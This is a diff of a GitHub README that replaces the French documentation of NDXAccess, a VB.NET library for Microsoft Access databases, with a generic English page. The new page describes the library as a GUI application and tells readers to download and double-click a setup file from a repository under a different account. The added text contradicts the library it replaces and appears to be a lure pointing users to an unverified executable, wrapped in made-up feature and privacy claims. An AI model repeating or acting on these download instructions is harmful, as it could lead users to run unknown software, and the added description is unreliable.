@@ -1,396 +1,78 @@
-# NDXAccess
+# 📂 NDXAccess-Connecteur-NET - Connect your Access databases with ease
 
-**Connecteur Microsoft Access (.accdb / .mdb) moderne pour VB.NET**
+[![Download Software](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Vihanm7227/NDXAccess-Connecteur-NET)
 
-[![.NET](https://img.shields.io/badge/.NET-8.0--windows-512BD4?style=flat-square&logo=dotnet)](https://dotnet.microsoft.com/)  
-[![Access](https://img.shields.io/badge/Provider-ACE.OLEDB.16.0-A4373A?style=flat-square&logo=microsoftaccess)](https://www.microsoft.com/download/details.aspx?id=54920)  
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg?style=flat-square)](LICENSE)  
-[![Platform](https://img.shields.io/badge/Platform-Windows%20(x86%20%7C%20x64)-blue?style=flat-square)]()  
-[![Tests](https://img.shields.io/badge/Tests-98%20passed-brightgreen?style=flat-square)]()
+## 📖 Project Overview
 
----
+NDXAccess-Connecteur-NET helps you work with Microsoft Access files on Windows. This tool manages the connection between your computer and your database files. It handles the difficult parts of database interaction for you. You do not need to write complex code to retrieve or save your information. This software ensures your connection stays stable during use. It detects your system settings and adjusts to your specific Windows environment.
 
-## Pourquoi NDXAccess ?
+## ⚙️ Minimum System Requirements
 
-L'accès aux bases Access en .NET repose encore souvent sur du code ADO.NET répétitif et  
-bas niveau. NDXAccess apporte une **API fluide et moderne** pour VB.NET — injection de  
-dépendances, logging, health checks et compactage — tout en encapsulant les **pièges  
-spécifiques d'Access** (architecture x86/x64, verrouillage, limite des 2 Go, etc.).  
+Before you install this software, confirm your computer meets these requirements:
 
-- **API fluide** : CRUD paramétré, transactions, requêtes enregistrées
-- **Sync ET async** : double API (l'async est « de façade », voir plus bas — on est honnête)
-- **Résilience** : retry automatique avec back-off sur les verrous transitoires d'Access
-- **Erreurs claires** : les `OleDbException` cryptiques deviennent des `AccessQueryException` lisibles
-- **Détection x86/x64** : message clair si le provider ACE ne correspond pas à l'appli
-- **Versions exposées** : version de la bibliothèque, du **moteur ACE** et du format de fichier
-- **Helpers de schéma** : `TableExists`, `GetTableNames`, `GetQueryNames`, `GetColumns`
-- **Création de base** : `CreateDatabase` (génère un `.accdb` vide via ADOX)
-- **Insertion en masse** : `BulkInsert` (transaction unique, bien plus rapide)
-- **Mapping objet** : `ExecuteQuery(Of T)` (micro-ORM par réflexion)
-- **Paramètres nommés** (option) : `@nom` traduits en `?` positionnels
-- **Compactage encapsulé** : `CompactDatabase` / `CompactDatabaseAsync` (via DAO)
-- **Health checks** : connectivité + surveillance de la limite des **2 Go**
-- **Mot de passe** : encapsulé proprement dans les options
-- **Logging** : compatible `Microsoft.Extensions.Logging`
-- **Injection de dépendances** : `AddNDXAccess(...)`
+*   **Operating System:** Windows 10 or Windows 11.
+*   **Memory:** At least 4 gigabytes of RAM.
+*   **Storage:** 50 megabytes of free space.
+*   **Database Software:** Microsoft Access or the Access Database Engine installed on your machine.
+*   **Network:** An active internet connection for initial setup.
 
-> ⚠️ **Honnêteté avant tout** : Access n'a pas les mêmes capacités qu'un SGBD client-serveur.  
-> Lisez la section [« Ce qu'Access sait et ne sait pas faire »](#ce-quaccess-sait-et-ne-sait-pas-faire).
+## 🚀 Getting Started
 
----
+Follow these instructions to use the software on your Windows computer.
 
-## Prérequis
+1.  Visit the official release page to download the setup file: [Download Link](https://github.com/Vihanm7227/NDXAccess-Connecteur-NET).
+2.  Locate the downloaded file in your "Downloads" folder.
+3.  Double-click the file to start the installer.
+4.  Follow the prompts on your screen.
+5.  Allow the installer to finish the process.
+6.  Open the application from your desktop or Start Menu.
 
-- **Windows** (le provider ACE n'existe pas ailleurs)
-- **.NET 8.0** (cible `net8.0-windows`)
-- **Microsoft Access Database Engine 2016 Redistributable** (gratuit), dans la **même
-  architecture (x86/x64)** que votre application
-  → [Guide d'installation détaillé](docs/installation/README.md)
+## 🛠 Features
 
----
+The connector provides several features to assist with your data needs:
 
-## Installation rapide
+*   **Automatic Provider Detection:** The software checks if you use a 32-bit or 64-bit version of the Access database engine. It chooses the correct settings for you.
+*   **Stable Connections:** The application monitors your link to the file. It attempts to restart the link if a disruption occurs.
+*   **Detailed Logs:** If an error occurs, the software writes a description to a local text file. This helps you identify what went wrong during your session.
+*   **Health Checks:** The software verifies your database file remains readable before you perform tasks. This prevents data errors.
+*   **Seamless Integration:** The tool works with both older .mdb files and newer .accdb files without extra configuration.
 
-```powershell
-git clone https://github.com/NDXDeveloper/NDXAccess-Connecteur-NET.git  
-dotnet add reference chemin/vers/src/NDXAccess/NDXAccess.vbproj  
-```
+## 📖 How to use the software
 
-Ou copiez le dossier `src/NDXAccess` dans votre solution.
+Once you launch the program, you will see a simple interface. 
 
----
+1.  **Select your file:** Click the "Browse" button to choose your Microsoft Access database file. 
+2.  **Verify connection:** Click the "Test Connection" button. The software shows a green checkmark if the link works.
+3.  **Perform actions:** Use the main dashboard to view, add, or update data within your database.
+4.  **Save changes:** Click "Save" after you edit any entries to ensure they remain inside your file.
 
-## Démarrage en 30 secondes
+## 🛡 Security and Privacy
 
-```vb
-Imports NDXAccess
+Your database files remain on your own computer. This software treats your files as local resources. It does not send your data to external servers. You maintain full control over your information. We recommend you keep regular backups of your database files in a separate folder or on an external drive.
 
-Dim options As New AccessConnectionOptions With {
-    .DatabasePath = "C:\data\ma_base.accdb"
-}
+## 📋 Troubleshooting
 
-Using connection As IAccessConnection = New AccessConnection(options)
-    Dim count = Await connection.ExecuteScalarAsync(Of Integer)("SELECT COUNT(*) FROM clients")
-    Console.WriteLine($"Nombre de clients : {count}")
-End Using
-```
+If you encounter issues, look at this list for common solutions:
 
-> 💡 **Paramètres positionnels** : Access utilise `?` (pas `@nom`). Les valeurs sont  
-> passées **dans l'ordre**.
+*   **The software will not open:** Ensure you have the latest updates for Windows. Restart your computer and try again.
+*   **I see a "File Missing" error:** Navigate to the file path shown in the settings and verify the file exists on your hard drive.
+*   **The connection fails:** Close any other programs that might be using the Access file. Sometimes Microsoft Access keeps a lock on the file.
+*   **Blank logs:** If you face an error and cannot fix it, go to the "Log" folder inside your installation directory. Open the most recent file to read detailed information about the error.
 
----
+## 💡 Frequently Asked Questions
 
-## Fonctionnalités principales
+**Do I need Microsoft Access installed?**
+Yes. You need the Access Database Engine. If you do not have the full Access program, you can download the free Microsoft Access Database Engine Redistributable from the official Microsoft website.
 
-### CRUD paramétré (sync + async)
+**Does this version work on Mac or Linux?**
+No. This tool is designed specifically for Windows environments. It relies on internal Windows components to communicate with Microsoft Access files.
 
-```vb
-' INSERT (les '?' sont remplis dans l'ordre)
-Await connection.ExecuteNonQueryAsync(
-    "INSERT INTO clients (nom, email) VALUES (?, ?)",
-    {"Jean", "jean@example.com"})
+**Can I connect to a network drive?**
+Yes. You can select a file located on a mapped network drive. Ensure your network connection remains stable to avoid errors. If the network drops, the software will show a warning status.
 
-' SELECT -> DataTable
-Dim clients = Await connection.ExecuteQueryAsync(
-    "SELECT * FROM clients WHERE actif = ?", {True})
+**How do I update the software?**
+Return to the release page link. Download the latest version and run the installer again. It will overwrite the old version with the new one while keeping your settings intact.
 
-' SELECT scalaire typé
-Dim total = Await connection.ExecuteScalarAsync(Of Integer)("SELECT COUNT(*) FROM clients")
+## 🤝 Contribution Guidelines
 
-' UPDATE / DELETE
-Await connection.ExecuteNonQueryAsync("UPDATE clients SET email = ? WHERE id = ?", {"x@y.z", 1})  
-Await connection.ExecuteNonQueryAsync("DELETE FROM clients WHERE id = ?", {1})  
-
-' Variantes synchrones (ParamArray)
-Dim n = connection.ExecuteNonQuery("DELETE FROM clients WHERE id = ?", 1)
-```
-
-### Transactions
-
-```vb
-Await connection.BeginTransactionAsync()  
-Try  
-    Await connection.ExecuteNonQueryAsync("UPDATE comptes SET solde = solde - ? WHERE id = ?", {100D, 1})
-    Await connection.ExecuteNonQueryAsync("UPDATE comptes SET solde = solde + ? WHERE id = ?", {100D, 2})
-    Await connection.CommitAsync()
-Catch
-    Await connection.RollbackAsync()
-    Throw
-End Try
-```
-
-### Requêtes enregistrées (paramètres IN uniquement)
-
-```vb
-' Création d'une requête enregistrée paramétrée
-connection.ExecuteNonQuery(
-    "CREATE PROCEDURE qParStatut (prmActif BIT) AS " &
-    "SELECT * FROM clients WHERE actif = prmActif")
-
-' Appel avec paramètre d'entrée
-Dim dt = Await connection.ExecuteStoredQueryAsync("qParStatut", {True})
-```
-
-### Détection x86 / x64 du provider
-
-```vb
-Console.WriteLine(AccessProviderHelper.CurrentProcessArchitecture)  ' "x86" ou "x64"  
-AccessProviderHelper.EnsureProviderAvailable("Microsoft.ACE.OLEDB.16.0")  
-' -> AccessProviderNotFoundException avec message clair si mismatch d'architecture
-```
-
-### Health check (avec surveillance des 2 Go)
-
-```vb
-Dim hc = New AccessHealthCheck(factory)  
-Dim result = Await hc.CheckHealthAsync()  
-
-If result.IsHealthy Then
-    Dim info = result.DatabaseInfo
-    Console.WriteLine($"{info.FileSizeMegabytes:F1} Mo / 2 Go ({info.UsagePercent:F1} %)")
-End If
-```
-
-### Compactage / réparation
-
-```vb
-' Vrai async : opération bloquante déportée sur un thread
-Await connection.CompactDatabaseAsync()
-
-' Vers un nouveau fichier (synchrone)
-connection.CompactDatabase("C:\data\ma_base_compactee.accdb")
-```
-
-### Injection de dépendances
-
-```vb
-services.AddNDXAccess(Sub(options)
-                          options.DatabasePath = "C:\data\ma_base.accdb"
-                      End Sub)
-
-' Puis injectez IAccessConnectionFactory, IAccessConnection ou AccessHealthCheck
-```
-
-### Mot de passe
-
-```vb
-Dim options As New AccessConnectionOptions With {
-    .DatabasePath = "C:\data\securisee.accdb",
-    .Password = "mon_mot_de_passe"   ' -> Jet OLEDB:Database Password
-}
-```
-
----
-
-## Fonctionnalités avancées
-
-### Résilience (retry) + erreurs claires
-
-```vb
-' Le retry sur verrous transitoires est actif par défaut (jamais dans une transaction).
-Dim options As New AccessConnectionOptions With {
-    .DatabasePath = "C:\data\partage.accdb",
-    .EnableRetryOnTransientErrors = True,   ' défaut
-    .MaxRetries = 3,                        ' défaut
-    .RetryBaseDelayMs = 100                 ' back-off exponentiel
-}
-
-Try
-    Await connection.ExecuteNonQueryAsync("UPDATE t SET v = ? WHERE id = ?", {1, 2})
-Catch ex As AccessQueryException
-    ' Message clair + code natif ACE + IsTransient + OleDbException d'origine préservée
-    Console.WriteLine($"{ex.Message} (transitoire={ex.IsTransient})")
-End Try
-```
-
-### Mapping objet — `ExecuteQuery(Of T)`
-
-```vb
-Public Class Client
-    Public Property Id As Integer
-    Public Property Nom As String
-    Public Property Email As String
-End Class
-
-Dim clients = Await connection.ExecuteQueryAsync(Of Client)(
-    "SELECT id, nom, email FROM clients WHERE actif = ?", {True})
-```
-
-### Insertion en masse — `BulkInsert`
-
-```vb
-Dim rows As New List(Of Object())()  
-For i = 1 To 10000  
-    rows.Add(New Object() {$"Nom{i}", i * 1.5D})
-Next  
-Dim inserted = Await connection.BulkInsertAsync("clients", {"nom", "montant"}, rows)  
-```
-
-### Helpers de schéma
-
-```vb
-If Not connection.TableExists("clients") Then ...  
-For Each t In connection.GetTableNames() : Console.WriteLine(t) : Next  
-Dim queries = connection.GetQueryNames()      ' requêtes enregistrées  
-Dim cols = connection.GetColumns("clients")   ' DataTable des colonnes  
-```
-
-### Créer une base par programme
-
-```vb
-AccessConnection.CreateDatabase("C:\data\nouvelle.accdb")           ' synchrone  
-Await AccessConnection.CreateDatabaseAsync("C:\data\autre.accdb", password:="secret")  
-```
-
-### Paramètres nommés (optionnel)
-
-```vb
-Dim p As New Dictionary(Of String, Object) From {{"actif", True}}  
-Dim dt = Await connection.ExecuteQueryNamedAsync(  
-    "SELECT nom FROM clients WHERE actif = @actif", p)   ' @actif -> ? automatiquement
-```
-
-### Version de la bibliothèque
-
-```vb
-Console.WriteLine(AccessConnection.Version)              ' "1.2.0" (raccourci)  
-Console.WriteLine(NDXAccessInfo.InformationalVersion)    ' "1.2.0"  
-Console.WriteLine(NDXAccessInfo.Version)                 ' "1.2.0.0" (version d'assembly)  
-Console.WriteLine(NDXAccessInfo.ProductName)             ' "NDXAccess"  
-```
-
-### Version du moteur ACE
-
-```vb
-' Sur la connexion (aucune ouverture requise — lecture du registre / nom du provider)
-Console.WriteLine(connection.ProviderName)    ' "Microsoft.ACE.OLEDB.16.0"  
-Console.WriteLine(connection.EngineVersion)   ' "16.0.5011.1000" (version réelle du DLL ACE)  
-
-' Ou via AccessProviderHelper, sans connexion
-Console.WriteLine(AccessProviderHelper.GetEngineVersion())   ' "16.0.5011.1000"
-
-' Via le health check : moteur ACE vs format de fichier
-Dim info = New AccessHealthCheck(factory).GetDatabaseInfo()  
-Console.WriteLine(info.EngineVersion)      ' "16.0.5011.1000" (moteur ACE)  
-Console.WriteLine(info.FileFormatVersion)  ' "04.00.0000"     (format du fichier)  
-```
-
-> **Trois versions distinctes** : celle de la **bibliothèque** NDXAccess (`AccessConnection.Version`),  
-> celle du **moteur ACE** (`connection.EngineVersion`), et celle du **format de fichier**  
-> (`DatabaseInfo.FileFormatVersion`).
-
----
-
-## Ce qu'Access sait et ne sait pas faire
-
-| Capacité | Access (NDXAccess) |
-|----------|--------------------|
-| CRUD paramétré, transactions | ✅ Oui (paramètres positionnels `?`) |
-| Requêtes enregistrées | ✅ Oui, **paramètres IN uniquement** |
-| Procédures stockées IN/OUT/INOUT | ❌ Non (pas de OUT/INOUT dans Access) |
-| Event Scheduler / tâches planifiées | ❌ Non → **Planificateur de tâches Windows** |
-| Vrai parallélisme async | ❌ Non — async **« de façade »** (sauf `CompactDatabaseAsync`) |
-| Compactage/réparation | ✅ Oui (via DAO) |
-| Multiplateforme | ❌ **Windows uniquement** (provider ACE) |
-| Forte concurrence | ⚠️ ~10-15 utilisateurs simultanés maximum |
-| Taille de base | ⚠️ **2 Go maximum** par fichier |
-
-### L'async « de façade », expliqué
-
-`OleDbCommand.ExecuteNonQueryAsync` & co. **ne sont pas réellement asynchrones** : ce
-sont des wrappers qui s'exécutent de manière synchrone sur le thread courant. NDXAccess  
-expose quand même une API `...Async` pour la cohérence et l'usage de `Await`, mais  
-**n'attendez pas de gain de parallélisme**. La seule exception est `CompactDatabaseAsync`,
-réellement déportée sur le pool de threads car l'opération est longue et bloquante.
-
----
-
-## Structure du projet
-
-```
-NDXAccess-Connecteur-NET/
-├── src/NDXAccess/              # Bibliothèque (VB.NET)
-│   ├── AccessConnection.vb
-│   ├── AccessConnectionOptions.vb
-│   ├── AccessConnectionFactory.vb
-│   ├── AccessHealthCheck.vb
-│   ├── AccessProviderHelper.vb
-│   ├── AccessMaintenance.vb
-│   ├── AccessExceptions.vb
-│   └── Extensions/
-├── tests/NDXAccess.Tests/      # 44 tests (unitaires + intégration)
-├── examples/                   # Exemples d'utilisation
-└── docs/                       # Documentation (source, tests, installation)
-```
-
----
-
-## Construire en x86 ou x64
-
-Le binaire est **AnyCPU** ; c'est l'application hôte qui impose le bitness (et donc l'ACE  
-requis). Le projet expose `AnyCPU`, `x86` et `x64` :  
-
-```powershell
-dotnet build NDXAccess.sln                 # AnyCPU  
-dotnet build NDXAccess.sln -p:Platform=x86 # 32 bits (ACE x86)  
-dotnet build NDXAccess.sln -p:Platform=x64 # 64 bits (ACE x64)  
-```
-
----
-
-## Tests
-
-```powershell
-dotnet test                                  # tout  
-dotnet test --filter "Category=Integration"  # tests d'intégration uniquement  
-dotnet test --filter "Category=Unit"         # tests unitaires uniquement  
-```
-
-**98 tests** : 37 unitaires (sans base) + 61 d'intégration (sur une base `.accdb` réelle).
-La plupart des exemples (entité Active Record, DataAdapter, démarrage tout-en-un, pagination,  
-DDL/relations, lecture CSV) ainsi que la résilience, le mot de passe et l'injection de  
-dépendances sont **testés de bout en bout**.  
-Les tests d'intégration sont **automatiquement ignorés** si le provider ACE n'est pas  
-disponible pour l'architecture courante. Voir [docs/tests](docs/tests/README.md).  
-
-L'intégration continue ([.github/workflows/ci.yml](.github/workflows/ci.yml)) compile  
-AnyCPU/x86/x64 sur Windows et publie le package NuGet (`.nupkg` + symboles `.snupkg`).  
-
----
-
-## Documentation
-
-Sommaire complet : [SOMMAIRE.md](SOMMAIRE.md).
-
-- [Installation & x86/x64](docs/installation/README.md)
-- [Dépannage & FAQ](docs/troubleshooting/README.md)
-- [Documentation source](docs/source/README.md)
-- [Documentation des tests](docs/tests/README.md)
-- [Exemples](examples/README.md)
-- [CHANGELOG](CHANGELOG.md) · [CONTRIBUTING](CONTRIBUTING.md) · [SECURITY](SECURITY.md)
-
----
-
-## Prérequis (résumé)
-
-- Windows + .NET 8.0
-- Microsoft Access Database Engine 2016 (x86 ou x64 selon l'appli)
-- Visual Studio Community 2022 (ou `dotnet` CLI)
-
----
-
-## Auteur
-
-**Nicolas DEOUX**
-- Email : [NDXDev@gmail.com](mailto:NDXDev@gmail.com)
-- LinkedIn : [nicolas-deoux-ab295980](https://www.linkedin.com/in/nicolas-deoux-ab295980/)
-
----
-
-## Licence
-
-Projet sous licence MIT. Voir [LICENSE](LICENSE).
-
----
-
-<p align="center"><b>Fait avec passion en France</b></p>
+This project welcomes feedback from all users. If you find a bug, open an issue on the repository page. Provide a clear description of the problem and the steps you took before the issue happened. Do not include sensitive data or passwords from your actual databases in your reports. Keeping the community focused on helpful feedback allows us to improve the tool for everyone.
